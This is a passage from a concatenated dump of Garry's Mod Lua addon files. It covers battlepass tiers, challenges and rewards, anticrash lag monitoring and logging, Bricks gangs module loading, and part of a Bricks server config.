		local tw = surface.GetTextSize(v.Desc)
		tw = tw + 88

		if (tw > width) then
			width = tw
		end
	end
	self:Lerp("Width", width, nil, function()
		self._InvalidateParent = nil
	end)
	self:Lerp("_Alpha", 255)
end

function PANEL:OnCursorExited()
	self._InvalidateParent = true

	self:Lerp("Width", 88, nil, function()
		self._InvalidateParent = nil
	end)
	self:Lerp("_Alpha", 0)
end

vgui.Register("XeninUI.Sidebar.Animated", PANEL)

--PATH addons/battlepass/lua/battlepass/shared/helper.lua:
function BATTLEPASS:Replace(str, tbl)
  for i, v in pairs(tbl) do
    str = str:Replace(":" .. i, v)
  end
  
  return str
end

function BATTLEPASS:SetupPass(ply)
  ply.BattlePass = ply.BattlePass or {}
	ply.BattlePass.Owned = ply.BattlePass.Owned or {
		owned = false,
		tier = 0,
		progress = 0,
    vars = {}
	}
end

function BATTLEPASS:CreateChallengeFromID(id)
  return table.Copy(self.Challenges[id])
end

function BATTLEPASS:AddTier(ply, amt)
  self:SetupPass(ply)

  ply.BattlePass.Owned.tier = math.Clamp(ply.BattlePass.Owned.tier + amt, 0, BATTLEPASS.Pass.tiers)

  if (SERVER) then
    self.Database:SavePlayer(ply)

    net.Start("BATTLEPASS.AddTier")
      net.WriteUInt(amt, 8)
    net.Send(ply)
  elseif (CLIENT) then
    local msg = BATTLEPASS:GetPhrase("Notifications.LevelUp", { level = ply.BattlePass.Owned.tier })

    notification.AddLegacy(msg, NOTIFY_GENERIC, 5)
    chat.AddText(BATTLEPASS.Config.ChatPrefixColor, BATTLEPASS.Config.ChatPrefixText, color_white, msg)

    local str = BATTLEPASS:GetPhrase("Notifications.ClaimReward")
    rp.Notify(5, str,"")
    chat.AddText(BATTLEPASS.Config.ChatPrefixColor, BATTLEPASS.Config.ChatPrefixText, color_white, str)
  end
end

function BATTLEPASS:SetTier(ply, amt)
  self:SetupPass(ply)

  ply.BattlePass.Owned.tier = math.min(amt, BATTLEPASS.Pass.tiers)
end

function BATTLEPASS:AddProgress(ply, amt)
  self:SetupPass(ply)

  -- DOn't allow em to get past the max tier
  if (ply.BattlePass.Owned.tier == BATTLEPASS.Pass.tiers) then return end

  ply.BattlePass.Owned.progress = ply.BattlePass.Owned.progress + amt

  if (ply.BattlePass.Owned.progress >= 10) then
    self:AddTier(ply, 1)
    self:AddProgress(ply, -10)
  end

  if (SERVER) then
    self.Database:SavePlayer(ply)
  end
end

function BATTLEPASS:SetProgress(ply, amt)
  self:SetupPass(ply)

  ply.BattlePass.Owned.progress = amt

  if (SERVER) then
    self.Database:SavePlayer(ply)
  end
end

function BATTLEPASS:SetOwned(ply, state)
  self:SetupPass(ply)

  ply.BattlePass.Owned.owned = state

  if (SERVER) then
    self.Database:SavePlayer(ply)
  end
end

function BATTLEPASS:SetVariables(ply, tbl)
  self:SetupPass(ply)

  ply.BattlePass.Owned.vars = tbl
end

function BATTLEPASS:AddVariable(ply, key, value)
  self:SetupPass(ply)

  ply.BattlePass.Owned.vars[key] = value

  if (SERVER) then
    self.Database:SaveVariable(ply, key, value)
  end
end

function BATTLEPASS:CreateItem(mdl, color, name, func, tooltip, extra)
  return {
    display = mdl,
    color = color,
    name = name,
    tooltip = tooltip,
    func = func,
    extra = extra or {}
  }
end

function BATTLEPASS:CreateChallenge(challengeId, goal, reward, name)
  return {
    id = challengeId,
    goal = goal,
    reward = reward,
    name = name
  }
end 

function BATTLEPASS:CreateCategory(id, name, tbl)
  local newTbl = {
    name = name,
    id = id,
    challenges = {}
  }
  
  for i, v in pairs(tbl) do
    local temp = v
    temp.uid = nil

    newTbl.challenges[v.uid] = temp
  end

  return newTbl
end

function BATTLEPASS:AddPass(pid, data)
  self.Pass = {
    id = pid,
    name = data.name,
    ends = data.ends,
    rewards = {
      free = data.rewards.free or {},
      premium = data.rewards.premium or {}
    },
    tiers = data.tiers,
    challenges = data.challenges
  }

  return self.Pass[pid]
end

function BATTLEPASS:ClaimItem(ply, premium, tier, index)
  if (premium and !ply.BattlePass.Owned.owned) then return end
  if (ply.BattlePass.Owned.tier < tier) then return end 

  ply.BattlePass.ClaimedItems = ply.BattlePass.ClaimedItems or {}
  local hasClaimedItem = ply.BattlePass.ClaimedItems[tier]
  if (hasClaimedItem) then
    if (premium) then
      hasClaimedItem = hasClaimedItem.premium and hasClaimedItem.premium[index]
    else
      hasClaimedItem = hasClaimedItem.free
    end
  end
  if (hasClaimedItem) then return end
  
  local item = BATTLEPASS.Pass.rewards[premium and "premium" or "free"][tier][index]
  if (!item) then return end
  local reward = BATTLEPASS.Rewards[item.Type]
  if (!reward) then return end

  local canUnlock, err = reward:CanUnlock(ply, item.Reward, item.Amount)
  if (!canUnlock) then
    if (CLIENT) then
      chat.AddText(BATTLEPASS.Config.ChatPrefixColor, BATTLEPASS.Config.ChatPrefixText, color_white, err)
    end

    return
  end

  if (premium) then
   ply.BattlePass.ClaimedItems[tier].premium[index] = true
  else
   ply.BattlePass.ClaimedItems[tier].free = true
  end

  reward:Unlock(ply, item.Reward, item.Amount)

  if (CLIENT) then
    chat.AddText(BATTLEPASS.Config.ChatPrefixColor, BATTLEPASS.Config.ChatPrefixText, color_white, "Ви взяли нагороду '" .. (item.Name or reward:GetName(item.Reward, item.Amount)) .. "'")
  end

  if (SERVER) then
    BATTLEPASS.Database:SaveClaim(ply, premium, tier, index)
  end
end

function BATTLEPASS:CanBuyPass(ply)
  return BATTLEPASS.Config.CanBuy(ply, BATTLEPASS.Config.PassPrice)
end

function BATTLEPASS:CanBuyTiers(ply, amt)
  if (!ply.BattlePass.Owned.owned) then return end

  return BATTLEPASS.Config.CanBuy(ply, BATTLEPASS.Config.TierPrice)
end
--PATH addons/battlepass/lua/battlepass/shared/challenges.lua:
local CHALLENGE = {}
CHALLENGE.__index = CHALLENGE

function CHALLENGE.New(player, name, desc, icon, uid, progress, goal)
	local self = setmetatable({}, CHALLENGE)
	self.name = name
	self.desc = desc
	self.icon = icon
	self.uid = uid
	self.stage = 1
	self.progress = progress or 0
	--self.goal = goal or 10
	self.goal = tonumber( goal ) and {goal} or istable( goal ) and goal or {10}
	self.player = player
	if (player) then
		self.pid = player:SteamID64()
	end
	self.hooks = {}

	table.sort( self.goal, function( a, b )
		return a > b
	end )

	return self
end

function CHALLENGE:SetName(name)
	self.name = name
end

function CHALLENGE:GetName()
	return self.name
end

function CHALLENGE:SetDesc(desc)
	self.desc = desc
end

function CHALLENGE:GetDesc()
	return self.desc
end

function CHALLENGE:SetIcon(icon)
	self.icon = icon
end

function CHALLENGE:GetIcon()
	return self.icon
end

function CHALLENGE:SetID(id)
	self.uid = id
end

function CHALLENGE:GetID()
	return self.uid
end

function CHALLENGE:SetStage( stage )
	self.stage = stage
end

function CHALLENGE:GetStage()
	return self.stage
end

function CHALLENGE:CheckStage()
end

function CHALLENGE:SetFormatting(func)
	self.format = func
end

function CHALLENGE:GetFormatting(...)
	return self.format(...)
end

function CHALLENGE:SetProgress(amt, calculateStage)
	local startProgress = self.progress or 0
	self.progress = amt

	if (calculateStage) then
		self:CalculateStage()
	end

	if (SERVER and startProgress < self:GetGoal()) then
		self:SaveThink()
	end
end

function CHALLENGE:GetProgress()
	return self.progress
end

function CHALLENGE:SaveThink()
	self:Save()
end

function CHALLENGE:SetFinishedDesc(str)
	self.doneDesc = str
end

function CHALLENGE:GetFinishedDesc()
	return self.doneDesc
end

function CHALLENGE:AddProgress(amt, dontSave)
    --local d = isnumber(BATTLEPASS.TimeCountdown - CurTime()) and string.FormattedTime(BATTLEPASS.TimeCountdown - os.time()) or false
	--if BATTLEPASS.TimeCountdown and math.Round(d.h / 24) < 0 then return end
	local startProgress = self.progress
	local maxGoal = self:GetMaxGoal()

	self.progress = math.Clamp(self.progress + amt, 0, maxGoal)

	if (self.progress >= self.goal[self.stage] and self.progress != maxGoal) then
		self:OnStageComplete()
	elseif (self.progress == maxGoal) then
		self:OnComplete()
	end
	
	self:CalculateStage()

	if (SERVER and startProgress < self:GetMaxGoal() and !dontSave) then
		self:SaveThink()
	end
end

function CHALLENGE:AddToQueue()
	if (self.player) then
		BATTLEPASS.QueuedChallengeRequests[self.player:SteamID64() .. "$_$" .. self.cat .. "$_$" .. self.index] = self.progress
	end
end

function CHALLENGE:Save()
	local cat = self.cat
	local index = self.index

	if (self.player) then
		BATTLEPASS.Database:SaveChallenge(self.player, cat, index)
	end
end

function CHALLENGE:IsComplete()
	return self:GetProgress() >= self:GetMaxGoal()
end

function CHALLENGE:CalculateStage()
	if !istable(self.goal) then return 1 end

	if (self.progress >= self.goal[#self.goal]) then self.stage = #self.goal end

	for k, v in pairs( self.goal ) do
		if v > self.progress then
			self.stage = k
			break
		end
	end
end

function CHALLENGE:IsStageComplete()
	return self:GetProgress() >= self.goal[self.stage]
end

function CHALLENGE:NetworkProgress()
	if CLIENT then return end
	
	net.Start("BATTLEPASS.SyncChallengeProgress")
		net.WriteString(self.cat)
		net.WriteUInt(self.index, 10)
		net.WriteFloat(self.progress)
		net.WriteUInt(self.player.BattlePass.Owned.progress, 8)
	net.Send(self.player)
end

function CHALLENGE:SetReward(reward)
	self.reward = tonumber( reward ) and {reward} or istable( reward ) and reward or {10}
end

function CHALLENGE:GetRewardByStage( override )
	return istable( self.reward ) and self.reward[override or self.stage] or istable(self.reward) and self.reward[1] or self.reward
end

function CHALLENGE:GetRewardByProgress( progress )
	local goal = self:GetGoalByProgress( progress )

	return istable(self.reward) and self.reward[goal] or self.reward
end

function CHALLENGE:SetGoal( goal )
	self.goal = tonumber( goal ) and {goal} or istable( goal ) and goal or {10}
end

function CHALLENGE:GetGoal()
	for k, v in pairs( self.goal ) do
		if v > self:GetProgress() then
			return v
		end
	end

	return self.goal and self.goal[1]
end

function CHALLENGE:GetGoalByProgress( progress )
	for k, v in pairs( self.goal ) do
		if v > progress then
			return v
		end
	end

	return self.goal and self.goal[1] or 0
end

function CHALLENGE:GetMaxGoal()
	return istable( self.goal ) and self.goal[#self.goal] or 10
end

function CHALLENGE:SetIcon(dir)
	self.icon = Material(dir, "smooth")
end

function CHALLENGE:SetInput(tbl)
	self.input = tbl
end

function CHALLENGE:SetPremium(bBool)
	self.onlypremium = bBool
end

function CHALLENGE:SetProgressDesc(desc)
	self.progressDesc = desc
end

function CHALLENGE:GetProgressDesc()
	return self.progressDesc
end

function CHALLENGE:OnComplete(ply)
	BATTLEPASS:AddProgress(ply or self.player, self.reward[#self.reward])

	self.stage = self.stage + 1

	if (CLIENT) then
		self:AddChallengeNotification()
	end

	self:Remove()
end

function CHALLENGE:OnStageComplete(ply)
	BATTLEPASS:AddProgress(ply or self.player, self.reward[self.stage])

	self.stage = self.stage + 1

	if (CLIENT) then
		self:AddStageNotification(self.stage - 1)
	end
end

function CHALLENGE:AddChallengeNotification()
	local tbl = BATTLEPASS.Pass.challenges[self.cat][self.index]
	local name = tbl.name
	if (!name) then
		name = BATTLEPASS.Challenges[tbl.id]:GetName()
	end

	local msg = BATTLEPASS:GetPhrase("Notifications.Reward", {
		name = name,
		stars = istable(self.reward) and self.reward[#self.reward] or self.reward
	})
	if SERVER then
		rp.Notify(LocalPlayer(), 5, msg, "")
	else
		rp.Notify(5, msg, "")
	end
	chat.AddText(BATTLEPASS.Config.ChatPrefixColor, BATTLEPASS.Config.ChatPrefixText, color_white, msg)
end

function CHALLENGE:AddStageNotification( stage )
	local tbl = BATTLEPASS.Pass.challenges[self.cat][self.index]
	local name = tbl.name
	if (!name) then
		name = BATTLEPASS.Challenges[tbl.id]:GetName()
	end

	local msg = BATTLEPASS:GetPhrase("Notifications.Reward", {
		name = name,
		stars = self:GetRewardByStage(stage)
	})
	if SERVER then
		rp.Notify(LocalPlayer(), 5, msg, "")
	else
		rp.Notify(5, msg, "")
	end
	chat.AddText(BATTLEPASS.Config.ChatPrefixColor, BATTLEPASS.Config.ChatPrefixText, color_white, msg)
end

function CHALLENGE:AddHook(str, func)
	self.hooks[str] = func
end

function CHALLENGE:AddTimer(delay, func)
	table.insert( self.timers, {delay = delay, func = func} )
end

function CHALLENGE:StopTracking()
	for k, v in pairs( self.hooks ) do
		hook.Remove(k, "BATTLEPASS_Challenges_" .. self.uid .. self.uniqueid .. self.pid)
	end

	timer.Remove("BATTLEPASS_Challenges_" .. self.uid .. self.uniqueid .. self.pid)
end

function CHALLENGE:StartTracking()
	for i, v in pairs(self.timers) do
		timer.Create("BATTLEPASS_Challenges_" .. self.uid .. self.uniqueid .. self.pid, v.delay, 0, function(...)
			if (!IsValid(self.player)) then self:Remove() return end

			if (!self:IsComplete()) then
				v.func(self, self.player, ...)
			end
		end )
	end

	for i, v in pairs(self.hooks) do
		hook.Add(i, "BATTLEPASS_Challenges_" .. self.uid .. self.uniqueid .. self.pid, function(...)
			if (IsValid(self.player)) then
				if (!self:IsComplete()) then
					v(self, self.player, ...)
				end
			else
				self:Remove()
			end
		end)
	end
end

function CHALLENGE:SetUniqueID(id)
	self.uniqueid = id
end

function CHALLENGE:SetPlayer(ply)
	self.player = ply
	self.pid = ply:SteamID64()
end

function CHALLENGE:Remove()
	self:StopTracking()
end

function BATTLEPASS:CreateTemplateChallenge(...)
	local tempTbl = table.Copy(CHALLENGE)
	tempTbl.hooks = {}
	tempTbl.timers = {}
	tempTbl.stage = 1
	tempTbl.progress = 0
	tempTbl.goal = { 10 }

	table.sort(tempTbl.goal, function(a, b)
		return a > b
	end)

	return tempTbl
end

function BATTLEPASS:RegisterChallenge(tbl)
	local id = tbl.uid
	if (!id) then return end

	BATTLEPASS.Challenges[id] = tbl
end

--PATH addons/battlepass/lua/battlepass/shared/rewards.lua:
BATTLEPASS.Rewards = BATTLEPASS.Rewards or {}

local REWARD = {}

function REWARD:CanUnlock(ply, reward)
	return false, "Not setup"
end

function REWARD:GetTooltip(reward, amount)
	return nil
end

function REWARD:GetModel(reward)
	return ".mdl"
end

function REWARD:GetPostDisplay(reward, amount)
	return nil
end

function REWARD:GetName(reward, amount)
	return "Didn't setup " .. reward
end

function REWARD:Unlock(ply, reward, amount)
	print("Unlock did nothing " .. ply:Nick() .. " " .. reward)
end

function REWARD:GetColor(reward)
	return BATTLEPASS.DefaultItemColor
end

function REWARD:GetCustomPanel()
	return nil
end

function REWARD:Register(name)
	BATTLEPASS.Rewards[name] = self
end

function BATTLEPASS:CreateReward()
	return table.Copy(REWARD)
end
--PATH addons/battlepass/lua/battlepass/rewards/givenodonateitem.lua:
local REWARD = BATTLEPASS:CreateReward()

function REWARD:CanUnlock(ply, reward)
    return true
end

function REWARD:GetTooltip(reward)
    return reward.name
end

function REWARD:GetModel(reward)
    return reward.model
end

function REWARD:GetName(reward)
    return reward.name
end

function REWARD:Unlock(ply, reward)
    if CLIENT then return end
    ply:Give(reward.id)
end

REWARD:Register("givenodonateitem")
--PATH addons/________anticrash/lua/z_anticrash/settings.lua:
-- [[ CREATED BY ZOMBIE EXTINGUISHER ]]

// SETTINGS
SH_ANTICRASH.SETTINGS = {}

SH_ANTICRASH.SETTINGS.HIGHCOLENTBLACKLIST = { -- Entities that will not be removed when exceeding collision intensity
	["example_classname"] = true, -- Entity class name
}

// Graph (menu)
SH_ANTICRASH.SETTINGS.GRAPH = {}
SH_ANTICRASH.SETTINGS.GRAPH.UPDATEDELAY = 2 -- Delay between graph updates in seconds (lower = less performant)
SH_ANTICRASH.SETTINGS.GRAPH.TIMEWINDOW = 60 -- Timewindow of the graph

// Lag Fix Measures
SH_ANTICRASH.SETTINGS.LAG = {}
SH_ANTICRASH.SETTINGS.LAG.Delay = 3 -- Amount of time in seconds before the lag should be fixed (higher number = less likable to recover)

SH_ANTICRASH.SETTINGS.LAG.REVERTCHANGES = true -- Remove all entities created X amount of minutes before the server lag
SH_ANTICRASH.SETTINGS.LAG.REVERTCHANGESTIME = 1 -- All entities placed in the last X amount of minutes will be removed
--PATH addons/________anticrash/lua/z_anticrash/client/cl_graphdata.lua:
-- [[ CREATED BY ZOMBIE EXTINGUISHER ]]

CL_ANTICRASH.GRAPH = {}

CL_ANTICRASH.GRAPH.COL = {
	PLAYERS = onyx:Config('colors.lightgray'),
	UPTIME = onyx:Config('colors.lightgray'),
	ENTITIES = onyx:Config('colors.lightgray'),
	SPAWNED = onyx:Config('colors.lightgray'),
	FPS = onyx:Config('colors.lightgray'),
	TICKRATE = onyx:Config('colors.lightgray'),
	ZLAG = Color(230, 58, 64),
	PROPS = Color(41, 128, 185),
	FROZENPROPS = Color(41, 183, 185),
	COLLISIONS = Color(230, 153, 58),
	NPCS = Color(189, 201, 15),
	VEHICLES = Color(46, 204, 113),
}

CL_ANTICRASH.GRAPH.INFO = {}
CL_ANTICRASH.GRAPH.INFO.PLAYERS = { cur = 0, max = game.MaxPlayers(), noDraw = true }
CL_ANTICRASH.GRAPH.INFO.UPTIME = { cur = 0, noDraw = true }
CL_ANTICRASH.GRAPH.INFO.ENTITIES = { cur = 0, noDraw = true }
CL_ANTICRASH.GRAPH.INFO.SPAWNED = { cur = 0, noDraw = true }
CL_ANTICRASH.GRAPH.INFO.FPS = { cur = 0, noDraw = true }
CL_ANTICRASH.GRAPH.INFO.TICKRATE = { cur = 0, noDraw = true }

CL_ANTICRASH.GRAPH.INFO.ZLAG = { cur = 0, max = SH_ANTICRASH.SETTINGS.LAG.Delay }
CL_ANTICRASH.GRAPH.INFO.PROPS = { cur = 0, max = 0 }
CL_ANTICRASH.GRAPH.INFO.FROZENPROPS = { cur = 0, noDraw = true }
CL_ANTICRASH.GRAPH.INFO.COLLISIONS = { cur = 0, max = 9999 }
CL_ANTICRASH.GRAPH.INFO.NPCS = { cur = 0, max = 150 }
CL_ANTICRASH.GRAPH.INFO.VEHICLES = { cur = 0, max = 100 }


CL_ANTICRASH.GRAPH.POINTS = {}
local function GraphPointUpdate()
		
	for k, v in pairs(CL_ANTICRASH.GRAPH.INFO) do
	
		if v.noDraw then continue end
		
		CL_ANTICRASH.GRAPH.POINTS[k] = CL_ANTICRASH.GRAPH.POINTS[k] or {}
		
		table.insert(CL_ANTICRASH.GRAPH.POINTS[k], 1, {
			cur = v.cur,
			max = v.max
		})
		
		if #CL_ANTICRASH.GRAPH.POINTS[k] > SH_ANTICRASH.SETTINGS.GRAPH.TIMEWINDOW+2 then
			table.remove( CL_ANTICRASH.GRAPH.POINTS[k], SH_ANTICRASH.SETTINGS.GRAPH.TIMEWINDOW+3 )
		end
		
	end
	
end

local nextUpdate = 0
local function GraphInfoUpdate()

	if !LocalPlayer():IsSuperAdmin() then return end

	if !CL_ANTICRASH.MenuIsOpen() then return end
	
	if nextUpdate < CurTime() then
	
		-- Players 
		CL_ANTICRASH.GRAPH.INFO.PLAYERS.cur = player.GetCount()
		
		-- Uptime
		CL_ANTICRASH.GRAPH.INFO.UPTIME.cur = SH_ANTICRASH.UTILS.TIME.Format(CurTime())
		
		-- Fps
		CL_ANTICRASH.GRAPH.INFO.FPS.cur = math.floor(1/RealFrameTime())
	
		-- Tickrate
		CL_ANTICRASH.GRAPH.INFO.TICKRATE.cur = math.floor(1/engine.ServerFrameTime()) -- engine.TickInterval()
		
		-- Lag
		CL_ANTICRASH.GRAPH.INFO.ZLAG.cur = GetGlobalFloat("z_anticrash_Lag")
		
		-- Spawned
		CL_ANTICRASH.GRAPH.INFO.SPAWNED.cur = GetGlobalInt("z_anticrash_Spawned")
		
		local entCount, propCount, npcCount, vehicleCount = 0, 0, 0, 0
		
		for k, ent in ents.Iterator() do
			
			entCount = entCount + 1
		
			if string.StartWith(ent:GetClass(),"prop_") then
				
				propCount = propCount + 1
				
			end
			
			if ent:IsNPC() or ent:IsNextBot() then
			
				npcCount = npcCount + 1
				
			elseif ent:IsVehicle() and ent:GetClass() ~= "prop_vehicle_prisoner_pod" then
			
				-- Only driving vehicles
				if ent:GetDriver() ~= NULL then
			
					vehicleCount = vehicleCount + 1
					
				end

			end
		
		end
		
		-- Entities
		CL_ANTICRASH.GRAPH.INFO.ENTITIES.cur = entCount
		
		-- Props
		CL_ANTICRASH.GRAPH.INFO.PROPS.cur = propCount
		CL_ANTICRASH.GRAPH.INFO.PROPS.max = 10000
		
		-- Freeze count
		CL_ANTICRASH.GRAPH.INFO.FROZENPROPS.cur = GetGlobalInt("z_anticrash_FreezeCount")
		
		-- Collision count
		CL_ANTICRASH.GRAPH.INFO.COLLISIONS.cur = GetGlobalInt("z_anticrash_CollisionCount")
		CL_ANTICRASH.GRAPH.INFO.COLLISIONS.max = propCount * 8
		
		-- NPC Count
		CL_ANTICRASH.GRAPH.INFO.NPCS.cur = npcCount
		
		-- Vehicle Count
		CL_ANTICRASH.GRAPH.INFO.VEHICLES.cur = vehicleCount
		
		-- Update data points
		GraphPointUpdate()
		
		nextUpdate = CurTime() + SH_ANTICRASH.SETTINGS.GRAPH.UPDATEDELAY

	end

end
hook.Add("Think","cl_anticrash_GraphInfoUpdate",GraphInfoUpdate)

--PATH addons/________anticrash/lua/z_anticrash/shared/sh_utils.lua:
-- [[ CREATED BY ZOMBIE EXTINGUISHER ]]

SH_ANTICRASH.UTILS = {}
SH_ANTICRASH.UTILS.LOG = {}
SH_ANTICRASH.UTILS.TIME = {}

// Time
function SH_ANTICRASH.UTILS.TIME.Format( seconds )

	seconds = seconds or 0
	local hours = math.floor(seconds / 3600)
	local minutes = math.floor((seconds / 60) % 60)
	seconds = seconds % 60
	
	return string.format("%02i:%02i:%02i", hours, minutes, seconds)
	
end

// Logging
local packedMSGFormat = {
	[1] = Color(230, 58, 64),
	[2] = "[Anti-Crash] ",
	[3] = color_white,
}

local function UnpackMSG(str,hasNL)
	
	local packedMSG = table.Copy(packedMSGFormat)
	packedMSG[4] = str..(hasNL and '\n' or '')
	
	return unpack(packedMSG)

end

function SH_ANTICRASH.UTILS.LOG.Print(str)
	
	if SERVER then
	
		SH_ANTICRASH.UTILS.LOG.ConsolePrintAdmins(str)
		
	else
	
		SH_ANTICRASH.UTILS.LOG.ConsolePrint(str)
		
	end
	
end

function SH_ANTICRASH.UTILS.LOG.PlyPrint(ply,str)
	SH_ANTICRASH.UTILS.LOG.Print(SH_ANTICRASH.UTILS.LOG.GetPlayerFormat(ply)..' '..str)
end

function SH_ANTICRASH.UTILS.LOG.GetPlayerFormat(ply)
	
	if IsValid(ply) then
	
		local steamID = ply:SteamID() or "STEAM_0:0:0"
		local nick = ply:Nick() or "ERROR"
	
		return "<"..steamID.."> "..nick	
	
	end
	
	return "Console"
	
end

function SH_ANTICRASH.UTILS.LOG.GetNick(ply)
	
	if IsValid(ply) then
		return ply:Nick()
	else
		return "Console"
	end

end

if CLIENT then

	local function ConsolePrint(len, ply)
		local str = isstring(len) and len or net.ReadString()
		
		-- Check for translation formats
		str = SH_ANTICRASH.Format(str)
		
		MsgC(UnpackMSG(str,true))
	end
	net.Receive("cl_anticrash_ConsolePrint",ConsolePrint)
	
	function SH_ANTICRASH.UTILS.LOG.ConsolePrint(str)
		ConsolePrint(str)
	end

end


if SERVER then
	
	function SH_ANTICRASH.UTILS.LOG.ChatPrint(ply,str)
		rp.notify( ply, SH_ANTICRASH.Format(str) )
	end
	
	function SH_ANTICRASH.UTILS.LOG.ChatPrintAll(str)
		rp.notify_all( SH_ANTICRASH.Format(str) )
	end
	
	util.AddNetworkString("cl_anticrash_ConsolePrint")
	function SH_ANTICRASH.UTILS.LOG.ConsolePrint(ply,str)
	
		if IsValid(ply) and ply:IsPlayer() then
			net.Start("cl_anticrash_ConsolePrint")
				net.WriteString(str)
			net.Send(ply)
		else
			SH_ANTICRASH.UTILS.LOG.ServerPrint(str)
		end
		
	end
	
	function SH_ANTICRASH.UTILS.LOG.ServerPrint(str)

		-- Server console
		local formattedStr = SH_ANTICRASH.Format(str)
		MsgC(UnpackMSG(formattedStr,true))
		
	end
	
	function SH_ANTICRASH.UTILS.LOG.ConsolePrintAdmins(str)
		
		-- Server Console
		SH_ANTICRASH.UTILS.LOG.ServerPrint(str)
		
		-- Admins
		for _, ply in player.Iterator() do
		
			if ply:IsSuperAdmin() then
				SH_ANTICRASH.UTILS.LOG.ConsolePrint(ply,str)
			end
		
		end
		
	end
	
end
--PATH addons/____bricks_gangs/lua/bricks_server/bricks_server_autorun_gangs.lua:
BRICKS_SERVER.GANGS = {}

local module = BRICKS_SERVER.Func.AddModule( "gangs", "Brick's Gangs", "materials/bricks_server/gangs.png", "1.7.6" )
module:AddSubModule( "achievements", "Achievements" )
module:AddSubModule( "associations", "Associations" )
module:AddSubModule( "leaderboards", "Leaderboards" )
module:AddSubModule( "printers", "Printers" )
module:AddSubModule( "storage", "Storage" )
module:AddSubModule( "territories", "Territories" )

hook.Add( "BRS.Hooks.BaseConfigLoad", "BricksServerHooks_BRS_BaseConfigLoad_Gangs", function()
    AddCSLuaFile( "bricks_server/bricks_gangs/sh_baseconfig.lua" )
    include( "bricks_server/bricks_gangs/sh_baseconfig.lua" )
end )

hook.Add( "BRS.Hooks.ClientConfigLoad", "BricksServerHooks_BRS_ClientConfigLoad_Gangs", function()
    AddCSLuaFile( "bricks_server/bricks_gangs/sh_clientconfig.lua" )
    include( "bricks_server/bricks_gangs/sh_clientconfig.lua" )
end )

hook.Add( "BRS.Hooks.DevConfigLoad", "BricksServerHooks_BRS_DevConfigLoad_Gangs", function()
    AddCSLuaFile( "bricks_server/bricks_gangs/sh_devconfig.lua" )
    include( "bricks_server/bricks_gangs/sh_devconfig.lua" )
end )

if( SERVER ) then
    hook.Add( "BRS.Hooks.SQLLoad", "BricksServerHooks_BRS_SQLLoad_Gangs", function()
        if( BRICKS_SERVER.GANGS.LUACFG.UseMySQL ) then
            include( "bricks_server/bricks_gangs/sv_mysql.lua" )
        else
            include( "bricks_server/bricks_gangs/sv_sqllite.lua" )
        end
    end )
end
--PATH addons/____bricks_framework/lua/bricks_server/bricks_server_basecfg_main.lua:
--[[
    !!WARNING!!
        ALL CONFIG IS DONE INGAME, DONT EDIT ANYTHING HERE
        Type !bricksserver ingame
    !!WARNING!!
]]--

--[[ MODULES CONFIG ]]--
BRICKS_SERVER.BASECONFIG.MODULES = BRICKS_SERVER.BASECONFIG.MODULES or {}
BRICKS_SERVER.BASECONFIG.MODULES["default"] = { true, {
    ["currencies"] = true
} }

--[[ GENERAL CONFIG ]]--
BRICKS_SERVER.BASECONFIG.GENERAL = BRICKS_SERVER.BASECONFIG.GENERAL or {}
BRICKS_SERVER.BASECONFIG.GENERAL["Donate Link"] = "https://www.blackrockgaming.co.uk/donate"
BRICKS_SERVER.BASECONFIG.GENERAL["Server Name"] = "BRG"
BRICKS_SERVER.BASECONFIG.GENERAL["3D2D Display Distance"] = 500000
BRICKS_SERVER.BASECONFIG.GENERAL["Use Textured Gradients (Better FPS)"] = true
BRICKS_SERVER.BASECONFIG.GENERAL.AdminPermissions = { 
    ["superadmin"] = true, 
    ["founder"] = true, 
    ["owner"] = true 
}
BRICKS_SERVER.BASECONFIG.GENERAL.Groups = {
    [1] = { "Staff", { ["moderator"] = true, ["admin"] = true, ["superadmin"] = true } },
    [2] = { "VIP++", { ["vip++"] = true, ["superadmin"] = true }, Color(201,176,55) },
    [3] = { "VIP+", { ["vip+"] = true, ["vip++"] = true, ["superadmin"] = true }, Color(180,180,180) },
    [4] = { "VIP", { ["vip"] = true, ["vip+"] = true, ["vip++"] = true, ["superadmin"] = true }, Color(173,138,86) },
    [5] = { "User", {}, Color(201, 70, 70), true }
}
BRICKS_SERVER.BASECONFIG.GENERAL.Rarities = {
    [1] = { "Common", "Gradient", { Color( 154, 154, 154 ), Color( 154*1.5, 154*1.5, 154*1.5 ) } },
    [2] = { "Uncommon", "Gradient", { Color( 104, 255, 104 ), Color( 104*1.5, 255*1.5, 104*1.5 ) } },
    [3] = { "Rare", "Gradient", { Color( 42, 133, 219 ),Color( 42*1.5, 133*1.5, 219*1.5 )  } },
    [4] = { "Epic", "Gradient", { Color( 152, 68, 255 ), Color( 152*1.5, 68*1.5, 255*1.5 ) } },
    [5] = { "Legendary", "Gradient", { Color( 253, 162, 77 ), Color( 253*1.5, 162*1.5, 77*1.5 ) } },
    [6] = { "Glitched", "Rainbow" }
}

--[[ LANGUAGE CONFIG ]]--
BRICKS_SERVER.BASECONFIG.LANGUAGE = {}
BRICKS_SERVER.BASECONFIG.LANGUAGE.Language = "english"
BRICKS_SERVER.BASECONFIG.LANGUAGE.Languages = {}

--[[ THEME CONFIG ]]--
BRICKS_SERVER.BASECONFIG.THEME = {}
BRICKS_SERVER.BASECONFIG.THEME[0] = Color(25, 25, 25)
BRICKS_SERVER.BASECONFIG.THEME[1] = Color(40, 40, 40)
BRICKS_SERVER.BASECONFIG.THEME[2] = Color(49, 49, 49)
BRICKS_SERVER.BASECONFIG.THEME[3] = Color(68, 68, 68)
BRICKS_SERVER.BASECONFIG.THEME[4] = Color(181, 50, 50)
BRICKS_SERVER.BASECONFIG.THEME[5] = Color(201, 70, 70)
BRICKS_SERVER.BASECONFIG.THEME[6] = Color(255, 255, 255)

--[[ INVENTORY ]]--
BRICKS_SERVER.BASECONFIG.INVENTORY = BRICKS_SERVER.BASECONFIG.INVENTORY or {}
BRICKS_SERVER.BASECONFIG.INVENTORY.ItemRarities = {
    ["Wood"] = "Uncommon",
    ["Scrap"] = "Uncommon",
    ["Iron"] = "Common",
    ["Plastic"] = "Common",
    ["Ruby"] = "Rare",
    ["Diamond"] = "Epic",
    ["weapon_ak472"] = "Legendary",
    ["weapon_deagle2"] = "Rare",
    ["weapon_fiveseven2"] = "Common",
    ["weapon_glock2"] = "Common",
    ["weapon_p2282"] = "Common",
    ["weapon_m42"] = "Rare",
    ["weapon_mac102"] = "Uncommon",
    ["weapon_mp52"] = "Uncommon",
    ["weapon_pumpshotgun2"] = "Uncommon",
    ["ls_sniper"] = "Epic",
}
BRICKS_SERVER.BASECONFIG.INVENTORY.Whitelist = {
